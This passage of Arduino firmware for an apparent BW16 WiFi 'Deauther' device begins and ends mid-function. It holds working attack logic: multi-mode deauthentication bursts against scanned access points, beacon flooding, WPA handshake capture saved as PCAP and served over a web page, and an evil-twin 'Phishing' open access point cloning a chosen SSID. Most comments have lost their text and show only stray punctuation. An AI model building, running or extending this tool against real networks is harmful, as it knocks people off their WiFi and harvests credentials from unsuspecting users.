  if (smartTargets.empty() && !SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
        target.channel = scan_results[selectedIndex].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    lastScanTime = millis();
  }

  // ：BSSID burst = perdeauth ，
  const unsigned int interFrameDelayUs = 100;  // ，250100，

  while (true) {
    // 
    showAttackStatusPage("Stable auto multi...");

    unsigned long currentTime = millis();

    // LED 
    if (currentTime - prevBlink >= blinkInterval) {
      redState = !redState;
      digitalWrite(LED_R, redState ? HIGH : LOW);
      prevBlink = currentTime;
    }

    // 
    if (currentTime - buttonCheckTime >= buttonCheckInterval) {
      if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
        digitalWrite(LED_R, LOW);
        digitalWrite(LED_G, LOW);
        digitalWrite(LED_B, LOW);
        delay(200);
        // 
        if (showConfirmModal("Stop attack?")) {
          return; // 
        }
        // ，LED
        startAttackLED();
      }
      buttonCheckTime = currentTime;
    }

    // （10）
    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
      std::vector<WiFiScanResult> backup = scan_results;
      updateSmartTargets();
      if (scan_results.empty()) {
        scan_results = std::move(backup);
      }
      lastScanTime = currentTime;
    }

    if (smartTargets.empty()) {
      delay(100);
      continue;
    }

    // ，，（）
    channelBucketsCache.clearBuckets();
    for (const auto &t : smartTargets) {
      if (t.active) {  // 
        channelBucketsCache.add(t.channel, t.bssid);
      }
    }

    int packetCount = 0;
    for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
      if (channelBucketsCache.buckets[chIdx].empty()) continue;
      wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
      for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
          digitalWrite(LED_R, LOW);
          digitalWrite(LED_G, LOW);
          digitalWrite(LED_B, LOW);
          delay(200);
          // 
          if (showConfirmModal("Stop attack?")) {
            return; // 
          }
          // ，LED
          startAttackLED();
        }
        // burst（），
        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);

        if (packetCount >= 200) { // 
          digitalWrite(LED_R, HIGH);
          delay(30);
          digitalWrite(LED_R, LOW);
          packetCount = 0;
        }
      }
    }

    delay(10);
  }
}

void DeauthMenu() {
  deauthstate = 0;
  int startIndex = 0;  // 
  const int MAX_DISPLAY_ITEMS = 4; // 4
  const int ITEM_HEIGHT = 16; // 
  const int Y_OFFSET = 2; // Y
  
  // ，/
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  unsigned long lastBackTime = 0;
  unsigned long lastOkTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    if(digitalRead(BTN_BACK)==LOW) {
      if (currentTime - lastBackTime <= DEBOUNCE_DELAY) continue;
      drawattack();
      break;
    }
    if(digitalRead(BTN_OK)==LOW){
      if (currentTime - lastOkTime <= DEBOUNCE_DELAY) continue;
      stabilizeButtonState(); // ：
      switch(deauthstate + startIndex) {
        case 0:
          if (showConfirmModal("Deauth attack?")) { StableAutoMulti(); break; }
          else { /* not confirmed, stay */ break; }
        case 1:
          if (showConfirmModal("Auto multi?")) { AutoMulti(); break; }
          else { break; }
        case 2:
          if (showConfirmModal("Auto single attack")) { AutoSingle(); break; }
          else { break; }
        case 3:
          if (showConfirmModal("All-channel attack")) { All(); break; }
          else { break; }
        case 4:
          if (showConfirmModal("Single attack")) { Single(); break; }
          else { break; }
        case 5:
          if (showConfirmModal("Multi attack")) { Multi(); break; }
          else { break; }
        case 6: drawattack(); break; // 
      }
      // case break; 
      lastOkTime = currentTime;
    }
    if(digitalRead(BTN_UP)==LOW){
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if(deauthstate > 0){
        int yFrom = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        deauthstate--;
        int yTo = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      } else if(startIndex > 0) {
        startIndex--;
        // ：
        int yFrom = Y_OFFSET + 1 * ITEM_HEIGHT;
        int yTo = Y_OFFSET + 0 * ITEM_HEIGHT;
        deauthstate = 0;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      }
      lastUpTime = currentTime;
    }
    if(digitalRead(BTN_DOWN)==LOW){
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if(deauthstate < MAX_DISPLAY_ITEMS - 1 && (startIndex + deauthstate < 6)){
        int yFrom = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        deauthstate++;
        int yTo = Y_OFFSET + deauthstate * ITEM_HEIGHT;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      } else if (deauthstate == MAX_DISPLAY_ITEMS - 1 && (startIndex + MAX_DISPLAY_ITEMS < 7)) {
        // ：，
        startIndex++;
        int yFrom = Y_OFFSET + (MAX_DISPLAY_ITEMS - 2) * ITEM_HEIGHT; // 
        int yTo = Y_OFFSET + (MAX_DISPLAY_ITEMS - 1) * ITEM_HEIGHT;   // 
        deauthstate = MAX_DISPLAY_ITEMS - 1;
        animateMoveDeauth(yFrom, yTo, 14, startIndex);
      }
      lastDownTime = currentTime;
    }
    
    display.clearDisplay();
    display.setTextSize(1);
    
    // （）
    const char* menuItems[] = {
      "Stable Auto Multi",
      "Auto Multi",
      "Auto Single",
      "All Channel",
      "Single Target",
      "Multi Target",
      "《 Back 》"
    };
    
    // - 
    for (int i = 0; i < MAX_DISPLAY_ITEMS && i < 7; i++) {  // 7
      int menuIndex = startIndex + i;
      if(menuIndex >= 7) break;  // 
      int yPos = Y_OFFSET + i * ITEM_HEIGHT;
      if (i == deauthstate) {
        display.fillRoundRect(0, yPos-2, display.width(), 14, 2, SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, false);
      }
    }
    // 
    display.display();
    delay(50);
  }
}
void drawattack() {
  attackstate = 0; // 
  int startIndex = 0; // 
  const int MAX_DISPLAY_ITEMS = 4; // 4
  const int ITEM_HEIGHT = 16; // 
  const int Y_OFFSET = 2; // Y
  
  // ，
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    if(digitalRead(BTN_BACK)==LOW) break;
    if (digitalRead(BTN_OK) == LOW) {
      delay(300);
      if (attackstate == 0) {
        if (SelectedVector.empty()) { 
          if (showSelectSSIDConfirmModal()) {
            drawssid(); // AP/SSID
          }
        }
        else { DeauthMenu(); break; }
        // 
      }
      if (attackstate == 1) {
        BeaconMenu();
        break;
      }
      if (attackstate == 2) {
        if (SelectedVector.empty()) {
          // ，
          if (showSelectSSIDConfirmModal()) {
            drawssid(); // AP/SSID
          }
        } else {
          if (showConfirmModal("Combo attack?")) {
            BeaconDeauth();
            break;
          }
        }
        // ，
      }
      if (attackstate == 3) { // 
        break;
      }
    }
    if (digitalRead(BTN_UP) == LOW) {
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if (attackstate > 0) {
        int yFrom = Y_OFFSET + attackstate * ITEM_HEIGHT;
        attackstate--;
        int yTo = Y_OFFSET + attackstate * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      } else if (startIndex > 0) {
        startIndex--;
        attackstate = MAX_DISPLAY_ITEMS - 2; // 
        // ：（）
        int yFrom = Y_OFFSET + (MAX_DISPLAY_ITEMS - 1) * ITEM_HEIGHT;
        int yTo = Y_OFFSET + (MAX_DISPLAY_ITEMS - 2) * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      }
      lastUpTime = currentTime;
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if (attackstate < MAX_DISPLAY_ITEMS - 1) {
        int yFrom = Y_OFFSET + attackstate * ITEM_HEIGHT;
        attackstate++;
        int yTo = Y_OFFSET + attackstate * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      } else if (startIndex + MAX_DISPLAY_ITEMS < 4) {
        startIndex++;
        // （）
        attackstate = MAX_DISPLAY_ITEMS - 1;
        // ：（3）
        int yFrom = Y_OFFSET + (MAX_DISPLAY_ITEMS - 2) * ITEM_HEIGHT;
        int yTo = Y_OFFSET + (MAX_DISPLAY_ITEMS - 1) * ITEM_HEIGHT;
        animateMoveFullWidth(yFrom, yTo, 14, drawAttackMenuBase_NoFlush, 2);
      }
      lastDownTime = currentTime;
    }
    
    // 
     display.clearDisplay();
    display.setTextSize(1);
    
    // 
    const char* menuItems[] = {
      "Deauth Attack",
      "Beacon Attack",
      "Beacon + Deauth",
      "《 Back 》"
    };
    
    // - 
    for (int i = 0; i < MAX_DISPLAY_ITEMS && i < 4; i++) {
      int menuIndex = startIndex + i;
      if (menuIndex >= 4) break; // 
      int yPos = Y_OFFSET + i * ITEM_HEIGHT;
      if (i == attackstate) {
        display.fillRoundRect(0, yPos-2, display.width(), 14, 2, SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, true);
      } else {
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        u8g2_for_adafruit_gfx.setCursor(5, yPos+10);
        u8g2_for_adafruit_gfx.print(menuItems[menuIndex]);
        drawRightChevron(yPos-2, 14, false);
      }
    }
    
    display.display();
    delay(50);
  }
}
void titleScreen(void) {
  char b[16]; unsigned int i = 0;
  static const uint8_t enc[] = {
    0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
  };
  for (unsigned int k = 0; k < sizeof(enc); k++) { b[i++] = (char)(((int)enc[k] - 7) ^ 0xA5); }
  b[i] = '\0';
  
  if (strcmp(b, "Please follow GPL-3.0, no resale") != 0) {
    char fix[16]; unsigned int j = 0;
    static const uint8_t fix_enc[] = {
      0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
    };
    for (unsigned int k = 0; k < sizeof(fix_enc); k++) { fix[j++] = (char)(((int)fix_enc[k] - 7) ^ 0xA5); }
    fix[j] = '\0';
    strcpy(b, fix);
  }
  
  for (int j = 0; j < TITLE_FRAMES; j++) {
    display.clearDisplay();
    int wifi_x = 54, wifi_y = 10;
    display.drawBitmap(wifi_x, wifi_y, image_wifi_not_connected__copy__bits, 19, 16, WHITE);
    
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    
    const char* leftBand = "2.4G";
    const char* rightBand = "5Ghz";
    u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB10_tr);
    u8g2_for_adafruit_gfx.setCursor(2, wifi_y + 12);
    u8g2_for_adafruit_gfx.print(leftBand);
    u8g2_for_adafruit_gfx.setCursor(128 - u8g2_for_adafruit_gfx.getUTF8Width(rightBand) - 2, wifi_y + 12);
    u8g2_for_adafruit_gfx.print(rightBand);
    
    u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB14_tr);
    
    bool shouldShow = (j % 3 < 2);
    u8g2_for_adafruit_gfx.setForegroundColor(shouldShow ? SSD1306_WHITE : SSD1306_BLACK);
    
    const char* txt = b;
    int txt_w = u8g2_for_adafruit_gfx.getUTF8Width(txt);
    int txt_x = (128 - txt_w) / 2;
    int txt_y = 48;
    
    if (shouldShow) {
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
      u8g2_for_adafruit_gfx.setCursor(txt_x + 1, txt_y + 1);
      u8g2_for_adafruit_gfx.print(txt);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    }
    
    u8g2_for_adafruit_gfx.setCursor(txt_x, txt_y);
    u8g2_for_adafruit_gfx.print(txt);
    
    // （，）- 
    int bar_w = (int)(128.0 * (j + 1) / TITLE_FRAMES);
    int bar_h = 6;
    int bar_x = 0, bar_y = 60;
    
    // 
    display.drawRect(bar_x, bar_y, 128, bar_h, WHITE);
    
    // - 
    if (bar_w > 2) {
      display.fillRect(bar_x + 1, bar_y + 1, bar_w - 2, bar_h - 2, WHITE);
      
      // 
      if (bar_w > 4) {
        display.drawLine(bar_x + 2, bar_y + 2, bar_x + bar_w - 3, bar_y + 2, BLACK);
      }
    }
    display.display();
    delay(TITLE_DELAY_MS);
  }
  display.clearDisplay();
  int wifi_x = 54, wifi_y = 10;
  display.drawBitmap(wifi_x, wifi_y, image_wifi_not_connected__copy__bits, 19, 16, WHITE);
  
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB10_tr);
  const char* leftBand = "2.4G";
  const char* rightBand = "5Ghz";
  u8g2_for_adafruit_gfx.setCursor(2, wifi_y + 12);
  u8g2_for_adafruit_gfx.print(leftBand);
  u8g2_for_adafruit_gfx.setCursor(128 - u8g2_for_adafruit_gfx.getUTF8Width(rightBand) - 2, wifi_y + 12);
  u8g2_for_adafruit_gfx.print(rightBand);
  
  u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB14_tr);
  const char* txt = b;
  int txt_w = u8g2_for_adafruit_gfx.getUTF8Width(txt);
  int txt_x = (128 - txt_w) / 2;
  int txt_y = 48;
  
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_BLACK);
  u8g2_for_adafruit_gfx.setCursor(txt_x + 1, txt_y + 1);
  u8g2_for_adafruit_gfx.print(txt);
  
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(txt_x, txt_y);
  u8g2_for_adafruit_gfx.print(txt);
  
  // - 
  int bar_h = 6;
  int bar_x = 0, bar_y = 60;
  display.drawRect(bar_x, bar_y, 128, bar_h, WHITE);
  display.fillRect(bar_x + 1, bar_y + 1, 128 - 2, bar_h - 2, WHITE);
  
  // 
  display.drawLine(bar_x + 2, bar_y + 2, bar_x + 126, bar_y + 2, BLACK);
  display.display();
  
  // ，
  u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
}
/**
 * @brief Arduino setup entry. Initializes IO, display, WiFi, and subsystems.
 *
 * Sets up LEDs/buttons, screen, networking, DNS/web, and initial state.
 */
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_BACK, INPUT_PULLUP);
  Serial.begin(115200);
  
  // LED
  Serial.println("=== BW16 WiFi Deauther Start ===");
  Serial.println("Init LED...");
  
  // 
  digitalWrite(LED_B, HIGH);
  Serial.println("Blue LED - Ready");
  
  // 
  initDisplay();
  
  // char v[16]; unsigned int c = 0; // 
  // static const uint8_t d[] = {
  //   0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
  // };
  // for (unsigned int k = 0; k < sizeof(d); k++) { v[c++] = (char)(((int)d[k] - 7) ^ 0xA5); }
  // v[c] = '\0';
  
  titleScreen();
  DEBUG_SER_INIT();
  
  Serial.println("Start AP...");
  String channelStr = String(current_channel);
  if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
    Serial.println("AP mode OK");
  } else {
    Serial.println("AP mode fail");
  }
  
  // （）
  Serial.println("Initial WiFi scan...");
  scanNetworks();

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif
  // SelectedSSID/SSIDCh 
}

void initDisplay() {
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true);
  }
  u8g2_for_adafruit_gfx.begin(display);
  u8g2_for_adafruit_gfx.setFont(u8g2_font_ncenB14_tr); // 
  display.clearDisplay();
  display.display();
}

static void enterStandbyFaceMode() {
  if (g_standbyFaceActive) return;
  g_standbyFaceActive = true;
  if (!g_face) {
    g_face = new Face(128, 64, 40);
    g_face->Expression.GoTo_Normal();
    g_face->RandomBehavior = true;
    g_face->RandomLook = true;
    g_face->RandomBlink = true;
    g_face->Blink.Timer.SetIntervalMillis(3500);
  }
  g_faceLastRandomizeMs = millis();
}

static void playRandomEmotion() {
  if (!g_face) return;
  int idx = random(0, (int)eEmotions::EMOTIONS_COUNT);
  g_face->Behavior.GoToEmotion((eEmotions)idx);
}

static bool handleStandbyFaceLoop() {
  if (!g_standbyFaceActive) return false;

  static unsigned long lastUp = 0, lastDown = 0, lastOk = 0, lastBack = 0;
  unsigned long now = millis();
  const unsigned long debounce = 120;
  const unsigned long longPress = 800;

  if (now - g_faceLastRandomizeMs >= FACE_RANDOMIZE_INTERVAL_MS) {
    g_faceLastRandomizeMs = now;
    g_face->Behavior.GoToEmotion(g_face->Behavior.GetRandomEmotion());
  }

  if (digitalRead(BTN_UP) == LOW) {
    if (now - lastUp > debounce) { playRandomEmotion(); lastUp = now; }
  }
  if (digitalRead(BTN_DOWN) == LOW) {
    if (now - lastDown > debounce) { playRandomEmotion(); lastDown = now; }
  }
  static bool okHeld = false; static unsigned long okPressTs = 0;
  if (digitalRead(BTN_OK) == LOW) {
    if (!okHeld) { okHeld = true; okPressTs = now; }
    if (okHeld && (now - okPressTs >= longPress)) {
      {
        char b[64]; unsigned int i = 0;
        static const uint8_t enc[] = {
          0xD4,0xD8,0xD8,0xDC,0xDD,0xA6,0x91,0x91,
          0xC9,0xD3,0xD8,0xD4,0xD7,0xCE,0x92,0xCD,0xD1,0xCF,
          0x91,
          0xEA,0xD0,0xE3,0xD3,0xD2,0xC9,0xF3,0xCD,0xC7,0xE3,0xE3,0xC8,0xDD,
          0x91,
          0xEE,0xF9,0x9B,0x9A,0x8F,0xF8,0xD1,0xD1,0xD0,0xDD,0x8C
        };
        for (unsigned int k = 0; k < sizeof(enc); k++) { b[i++] = (char)(((int)enc[k] - 7) ^ 0xA5); }
        b[i] = '\0';
        u8g2_for_adafruit_gfx.setFontMode(1);
        u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
        const int padX = 6, padY = 4, lineH = 12;
        const int maxTextW = display.width() - padX * 2;
        String lines[6]; int lineCount = 0; String cur = ""; int curW = 0; int maxW = 0;
        int lastBreakPos = -1; int lastBreakW = 0;
        for (int j = 0; b[j] != '\0'; j++) {
          char ch = b[j];
          char tmp[2] = { ch, '\0' };
          int wch = u8g2_for_adafruit_gfx.getUTF8Width(tmp);
          if (wch <= 0) wch = 6;
          if (curW + wch > maxTextW && cur.length() > 0) {
            int cutLen = (lastBreakPos >= 0) ? (lastBreakPos + 1) : (int)cur.length();
            int cutW = (lastBreakPos >= 0) ? lastBreakW : curW;
            if (lineCount < 6) { lines[lineCount++] = cur.substring(0, cutLen); if (cutW > maxW) maxW = cutW; }
            // 
            String rem = cur.substring(cutLen);
            cur = rem; curW = 0; lastBreakPos = -1; lastBreakW = 0;
            // 
            for (unsigned int k = 0; k < rem.length(); k++) {
              char t[2] = { rem[k], '\0' }; int w = u8g2_for_adafruit_gfx.getUTF8Width(t); if (w <= 0) w = 6; curW += w;
              if (rem[k] == '/' || rem[k] == '-' || rem[k] == '.') { lastBreakPos = k; lastBreakW = curW; }
            }
          }
          cur += ch; curW += wch;
          if (ch == '/' || ch == '-' || ch == '.') { lastBreakPos = cur.length() - 1; lastBreakW = curW; }
        }
        if (cur.length() > 0 && lineCount < 6) { lines[lineCount++] = cur; if (curW > maxW) maxW = curW; }
        if (lineCount == 0) { lines[lineCount++] = String(b); maxW = u8g2_for_adafruit_gfx.getUTF8Width(b); if (maxW < 0) maxW = 120; }
        int boxW = maxW;
        int boxH = lineCount * lineH + padY * 2;
        int boxX = (display.width() - boxW) / 2; if (boxX < 0) boxX = 0;
        int boxY = (display.height() - boxH) / 2; if (boxY < 0) boxY = 0;
        display.fillRect(boxX - padX, boxY, boxW + padX * 2, boxH, SSD1306_BLACK);
        for (int li = 0; li < lineCount; li++) {
          int wline = u8g2_for_adafruit_gfx.getUTF8Width(lines[li].c_str());
          if (wline < 0) wline = boxW;
          int lx = boxX + (boxW - wline) / 2;
          int ly = boxY + padY + lineH * (li + 1);
          u8g2_for_adafruit_gfx.setCursor(lx, ly);
          u8g2_for_adafruit_gfx.print(lines[li]);
        }
        display.display();
        delay(1000);
      }
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      okHeld = false; lastOk = millis();
    }
  } else {
    if (okHeld) {
      if ((now - okPressTs) >= debounce && (now - okPressTs) < longPress) {
        playRandomEmotion();
      }
    }
    okHeld = false;
    if (now - lastOk > debounce) { lastOk = now; }
  }
  static bool backHeld = false; static unsigned long backPressTs = 0;
  if (digitalRead(BTN_BACK) == LOW) {
    if (!backHeld) {
      backHeld = true; backPressTs = now;
      if (now - lastBack > debounce) { playRandomEmotion(); lastBack = now; }
    }
    if (backHeld && (now - backPressTs >= longPress)) {
      g_standbyFaceActive = false;
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      g_face->Expression.GoTo_Normal();
      return false;
    }
  } else {
    backHeld = false;
    if (now - lastBack > debounce) { lastBack = now; }
  }

  g_face->Update();
  return true;
}

/**
 * @brief Main loop. Handles UI, key scanning, networking, and tasks.
 *
 * Runs periodically; uses millis()-based timing to update state and render.
 */
void loop() {
  unsigned long currentTime = millis();
  
  // LED
  updateLEDs();
  
  // 
  if (g_deauthState.running) {
    switch (g_deauthState.mode) {
      case ATTACK_SINGLE:
        processSingleAttack();
        break;
      case ATTACK_MULTI:
        processMultiAttack();
        break;
      case ATTACK_AUTO_SINGLE:
        processAutoSingleAttack();
        break;
      case ATTACK_AUTO_MULTI:
        processAutoMultiAttack();
        break;
      case ATTACK_ALL:
        processAllAttack();
        break;
      case ATTACK_BEACON_DEAUTH:
        processBeaconDeauthAttack();
        break;
      default:
        break;
    }
    return; // 
  }
  
  static unsigned long lastCheck = 0;
  if (currentTime - lastCheck > 30000) {
    // char t[16]; unsigned int n = 0; // 
    // static const uint8_t chk[] = {
    //   0xee,0xf9,0x9b,0x9a,0x8c,0xf8,0xd1,0xd1,0xd0,0xdd
    // };
    // for (unsigned int k = 0; k < sizeof(chk); k++) { t[n++] = (char)(((int)chk[k] - 7) ^ 0xA5); }
    // t[n] = '\0';
    lastCheck = currentTime;
  }
  
  // 
  checkEmergencyStop();
  
  // Web UI/Web Test 
  if (web_ui_active) {
    // Web UI
    performWebUIHealthCheck(currentTime);
    
    // ，WebUI
    if (readyToSniff && !sniffer_active) {
      Serial.println("[HS] Trigger capture from loop()");
      deauthAndSniff(); // 
    }
    
    // （WebUI）
    if (sniffer_active) {
      deauthAndSniff_update();
    }

    handleWebUI();
    return;
  }
  if (web_test_active) {
    // 
    performPhishingHealthCheck(currentTime);
    
    handleWebTest();
    return;
  }
  
  // 
  if (quick_capture_active) {
    // 
    displayQuickCaptureProgress();
    
    // ，（）
    if (readyToSniff && !sniffer_active) {
      Serial.println("[QuickCapture] Trigger capture from loop()");
      deauthAndSniff(); // 
    }
    
    // 
    if (sniffer_active) {
      deauthAndSniff_update();
    }
    
    // - deauthAndSniff_update()
    if (!sniffer_active && readyToSniff == false && quick_capture_active) {
      // deauthAndSniff_update()，
      static unsigned long lastCheckTime = 0;
      if (millis() - lastCheckTime > 1000) { // 
        lastCheckTime = millis();
        Serial.print("[QuickCapture] Status check - isHandshakeCaptured: ");
        Serial.print(isHandshakeCaptured);
        Serial.print(", handshakeDataAvailable: ");
        Serial.print(handshakeDataAvailable);
        Serial.print(", HS frames: ");
        Serial.print(capturedHandshake.frameCount);
        Serial.print("/4, MGMT frames: ");
        Serial.print(capturedManagement.frameCount);
        Serial.println("/10");
        
        // ：，
        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
          // 
          bool oldVerboseLog = g_verboseHandshakeLog;
          g_verboseHandshakeLog = true;
          
          if (isHandshakeCompleteQuickCapture()) {
            Serial.println("[QuickCapture] Complete handshake detected in main loop, setting flags");
            // 
            std::vector<uint8_t> pcapData = generatePcapBuffer();
            Serial.print("PCAP size: "); Serial.print(pcapData.size()); Serial.println(" bytes");
            globalPcapData = pcapData;
            // 
            isHandshakeCaptured = true;
            handshakeDataAvailable = true;
            // 
            lastCaptureTimestamp = millis();
            lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
            lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
            handshakeJustCaptured = true;
          } else {
            Serial.println("[QuickCapture] Invalid handshake detected, clearing stats and restarting capture");
            // 
            resetCaptureData();
            resetGlobalHandshakeData();
            // 
            readyToSniff = true;
            hs_sniffer_running = true;
            sniffer_active = false; // 
            Serial.println("[QuickCapture] Capture restarted with cleared stats");
          }
          
          // 
          g_verboseHandshakeLog = oldVerboseLog;
        }
      }
      
      if (isHandshakeCaptured && handshakeDataAvailable) {
        Serial.println("[QuickCapture] Handshake captured successfully!");
        quick_capture_completed = true;
        quick_capture_end_time = millis();
        
        // Web
        startWebServiceForCapture();
        
        // 
        quick_capture_active = false;
        readyToSniff = false;
        hs_sniffer_running = false;
        sniffer_active = false;
        
        // Web
        drawWebServiceInfo();
        return;
      } else {
        // ，
        if (millis() - quick_capture_start_time > 60000) {
          Serial.println("[QuickCapture] Capture timeout");
          quick_capture_active = false;
          drawQuickCaptureTimeout();
        }
      }
    }
    
    // 
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      // ，
      stabilizeButtonState();
      if (showConfirmModal("Stop capture?")) {
        Serial.println("[QuickCapture] User stopped capture");
        quick_capture_active = false;
        readyToSniff = false;
        hs_sniffer_running = false;
        sniffer_active = false;
        return;
      }
    }
    
    return;
  }
  
  // Web
  if (quick_capture_completed && web_server_active) {
    // Web - 
    unsigned long currentTime = millis();
    if (currentTime - last_web_check >= 100) { // 
      last_web_check = currentTime;
      
      WiFiClient client = web_server.available();
      if (client) {
        // 
        client.setTimeout(5000);
        Serial.println("[QuickCapture] Web client connected");
        handleWebClient(client);
        client.stop(); // ，
      }
    }
    
    // DNS，
    
    // Web
    static unsigned long last_status_update = 0;
    if (currentTime - last_status_update >= 2000) {
      last_status_update = currentTime;
      displayWebServiceStatus();
    }
    return;
  }
  // ，
  
  // - 
  if (menustate >= 0 && menustate < HOME_MAX_ITEMS) {
    drawHomeMenu();
  }
  
  // 
  handleHomeOk();

  // ，
  if (digitalRead(BTN_UP) == LOW) {
    // UP+DOWN：
    if (digitalRead(BTN_DOWN) == LOW) {
      enterStandbyFaceMode();
    } else {
      homeMoveUp(currentTime);
    }
  }
  if (digitalRead(BTN_DOWN) == LOW) {
    if (digitalRead(BTN_UP) == LOW) {
      enterStandbyFaceMode();
    } else {
      homeMoveDown(currentTime);
    }
  }

  // ，
  if (g_standbyFaceActive) {
    while (g_standbyFaceActive) {
      if (!handleStandbyFaceLoop()) break;
      delay(10);
    }
  }
}

// Web UI

// Web Test（SSID）
bool startWebTest() {
  Serial.println("=== Start Phishing ===");
  Serial.println("Close orig AP...");

  if (g_webTestLocked) {
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 20);
    u8g2_for_adafruit_gfx.print("To free resources");
    u8g2_for_adafruit_gfx.setCursor(5, 40);
    u8g2_for_adafruit_gfx.print("Reboot required");
    display.display();
    // 
    while (digitalRead(BTN_BACK) != LOW) { delay(10); }
    while (digitalRead(BTN_BACK) == LOW) { delay(10); }
    return false;
  }

  // OLED 

  // AP、，SSID

  // ：
  checkAndCleanupPhishingProcesses();

  // 
  cleanupBeforePhishingStart();

  Serial.println("Start phishing open AP...");
  char test_channel_str[4];
  // SDKconst
  // SSID（SSIDMAC）
  String chosenSsid;
  if (!SelectedVector.empty()) {
    int chosenIndex = SelectedVector[0];
    if (chosenIndex >= 0 && (size_t)chosenIndex < scan_results.size()) {
      chosenSsid = scan_results[chosenIndex].ssid;
      memcpy(phishingTargetBSSID, scan_results[chosenIndex].bssid, 6);
      phishingHasTarget = true;
      if (chosenSsid.length() == 0) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 scan_results[chosenIndex].bssid[0],
